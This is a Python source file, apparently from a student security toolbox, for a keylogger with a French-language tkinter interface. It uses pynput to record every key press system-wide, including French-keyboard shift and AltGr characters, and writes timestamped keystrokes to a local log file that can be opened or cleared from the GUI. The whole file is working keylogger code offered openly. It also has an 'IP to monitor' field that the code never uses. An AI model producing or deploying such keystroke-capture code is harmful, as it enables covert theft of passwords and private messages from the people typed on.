from tkinter import *
from tkinter import messagebox
from pynput import keyboard
import os
import datetime
import traceback

class KeyloggerGUI:

    def __init__(self, master):
        self.master = master
        self.master.title("Keylogger")
        self.master.configure(bg='blue')
        
        # Welcome Label
        self.label = Label(master, text="Bienvenue sur le Keylogger", bg='blue', fg='white', font=('Helvetica', 14))
        self.label.pack(pady=10)
        
        # IP Entry
        self.ip_label = Label(master, text="IP à surveiller :", bg='blue', fg='white', font=('Helvetica', 12))
        self.ip_label.pack(pady=5)
        
        self.ip_entry = Entry(master, width=50)
        self.ip_entry.pack(pady=5)
        
        # Buttons Frame
        self.buttons_frame = Frame(master, bg='blue')
        self.buttons_frame.pack(pady=20)
        
        # Start Button
        self.start_button = Button(self.buttons_frame, text="Démarrer", command=self.start_logging, width=15)
        self.start_button.grid(row=0, column=0, padx=5)
        
        # Stop Button
        self.stop_button = Button(self.buttons_frame, text="Arrêter", command=self.stop_logging, width=15)
        self.stop_button.grid(row=0, column=1, padx=5)
        
        # Open Log Button
        self.open_log_button = Button(self.buttons_frame, text="Ouvrir le fichier de log", command=self.open_log_file, width=20)
        self.open_log_button.grid(row=1, column=0, columnspan=2, pady=10)
        
        self.logger = None
        self.shift_pressed = False
        self.alt_gr_pressed = False
        self.num_lock_state = None  # Track the state of Num Lock
        self.log_directory = "C:/Users/ishak/Documents/ESI-2023-2024/Projet-Tool-Box/result_keylog"
        self.log_file_path = os.path.join(self.log_directory, "keylog.txt")

        # Ensure the directory exists
        if not os.path.exists(self.log_directory):
            os.makedirs(self.log_directory)

    def start_logging(self):
        ip = self.ip_entry.get()

        if not ip:
            self.label.config(text="Veuillez saisir une IP à surveiller.")
            return

        try:
            self.logger = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.logger.start()
            self.label.config(text=f"Keylogger en cours d'exécution sur {ip}")
            print("Keylogger started.")
        except Exception as e:
            self.label.config(text="Erreur lors du démarrage du keylogger.")
            print(f"Erreur lors du démarrage du keylogger: {traceback.format_exc()}")

    def stop_logging(self):
        if self.logger:
            try:
                self.logger.stop()
                self.logger = None
                self.label.config(text="Le keylogger est arrêté.")
                print("Keylogger stopped.")
            except Exception as e:
                self.label.config(text="Erreur lors de l'arrêt du keylogger.")
                print(f"Erreur lors de l'arrêt du keylogger: {traceback.format_exc()}")

    def on_press(self, key):
        try:
            if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
                self.shift_pressed = True
            elif key == keyboard.Key.alt_gr:
                self.alt_gr_pressed = True
            elif key == keyboard.Key.num_lock:
                self.num_lock_state = not self.num_lock_state  # Toggle Num Lock state
            else:
                key_str = self.format_key(key)
                if key_str:
                    self.log_key(key_str)
        except Exception as e:
            print(f"Erreur lors de la détection de la touche: {traceback.format_exc()}")

    def on_release(self, key):
        if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            self.shift_pressed = False
        elif key == keyboard.Key.alt_gr:
            self.alt_gr_pressed = False

    def format_key(self, key):
        try:
            if isinstance(key, keyboard.KeyCode):
                char = key.char
                if char:
                    if self.shift_pressed:
                        shift_map = {
                            '&': '1', 'é': '2', '"': '3', "'": '4', '(': '5',
                            '-': '6', 'è': '7', '_': '8', 'ç': '9', 'à': '0'
                        }
                        return shift_map.get(char, char.upper())
                    elif self.alt_gr_pressed:
                        alt_gr_map = {
                            '2': '~', '3': '#', '4': '{', '5': '[', '6': '|',
                            '7': '`', '8': '\\', '9': '^', '0': '@', '-': ']',
                            '=': '}', 'e': '€'
                        }
                        return alt_gr_map.get(char, char)
                    return char
            elif isinstance(key, keyboard.Key):
                key_map = {
                    keyboard.Key.space: " ",
                    keyboard.Key.enter: "enter",
                    keyboard.Key.tab: "tab",
                    keyboard.Key.backspace: "backspace",
                    keyboard.Key.num_lock: "num_lock",
                    keyboard.Key.end: "end",
                    keyboard.Key.down: "down",
                    keyboard.Key.left: "left",
                    keyboard.Key.right: "right",
                    keyboard.Key.up: "up",
                    keyboard.Key.page_down: "page_down",
                    keyboard.Key.page_up: "page_up",
                    keyboard.Key.home: "home",
                    keyboard.Key.insert: "insert",
                    keyboard.Key.delete: "delete",
                    keyboard.Key.media_volume_up: "volume_up",
                    keyboard.Key.media_volume_down: "volume_down"
                }
                numpad_map = {
                    keyboard.KeyCode.from_vk(96): "0",
                    keyboard.KeyCode.from_vk(97): "1",
                    keyboard.KeyCode.from_vk(98): "2",
                    keyboard.KeyCode.from_vk(99): "3",
                    keyboard.KeyCode.from_vk(100): "4",
                    keyboard.KeyCode.from_vk(101): "5",
                    keyboard.KeyCode.from_vk(102): "6",
                    keyboard.KeyCode.from_vk(103): "7",
                    keyboard.KeyCode.from_vk(104): "8",
                    keyboard.KeyCode.from_vk(105): "9",
                    keyboard.KeyCode.from_vk(106): "*",
                    keyboard.KeyCode.from_vk(107): "+",
                    keyboard.KeyCode.from_vk(109): "-",
                    keyboard.KeyCode.from_vk(110): ".",
                    keyboard.KeyCode.from_vk(111): "/"
                }
                if key in numpad_map:
                    return numpad_map[key]
                if key in key_map:
                    return key_map[key]
                return key.name
        except AttributeError:
            return None
        return None

    def log_key(self, key_str):
        try:
            with open(self.log_file_path, 'a') as logs:
                log_entry = f'"{datetime.datetime.now().strftime("%H:%M")}", "{key_str}"\n'
                logs.write(log_entry)
            print(f"Touche enregistrée: {log_entry}")
        except Exception as e:
            print(f"Erreur lors de l'écriture dans le fichier de log: {traceback.format_exc()}")

    def open_log_file(self):
        if os.path.exists(self.log_file_path):
            os.system(f"notepad.exe {self.log_file_path}")
            self.ask_clear_log()
        else:
            self.label.config(text="Le fichier de log n'existe pas encore.")

    def ask_clear_log(self):
        response = messagebox.askyesno("Effacer le log", "Voulez-vous effacer les anciens logs ?")
        if response:
            self.clear_log_file()

    def clear_log_file(self):
        try:
            with open(self.log_file_path, 'w') as logs:
                logs.write("")  # Clear the file
            print("Fichier de log vidé.")
        except Exception as e:
            print(f"Erreur lors de l'effacement du fichier de log: {traceback.format_exc()}")

root = Tk()
root.geometry("400x300")
my_gui = KeyloggerGUI(root)
root.mainloop()
